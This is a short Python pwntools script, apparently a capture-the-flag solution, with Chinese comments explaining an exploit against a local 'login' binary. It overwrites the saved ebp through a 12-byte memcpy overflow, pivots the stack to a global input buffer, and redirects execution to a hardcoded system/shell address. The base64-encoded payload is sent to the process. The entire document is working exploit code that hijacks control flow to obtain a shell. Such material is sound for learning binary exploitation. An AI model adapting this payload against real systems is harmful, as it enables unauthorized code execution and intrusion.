#!/bin/python
# coding:utf-8 

# 允许输入12个字节，在auth的memcpy函数只能覆盖到ebp，不能覆盖返回地址
# 将ebp覆盖为全局变量input的地址，input的4到8位输入为执行system的地址
# 当程序从auth返回时，ebp变为input的地址，当main返回时，sys_shell将被pop到eip

from pwn import *

pro = process('./login')

#print pro.recvline()
input_addr = 0x0811eb40
sys_shell = 0x8049278

payload = 'a'*4 + p32(sys_shell) + p32(input_addr)

pro.send(payload.encode('base64'))
print pro.recvall()
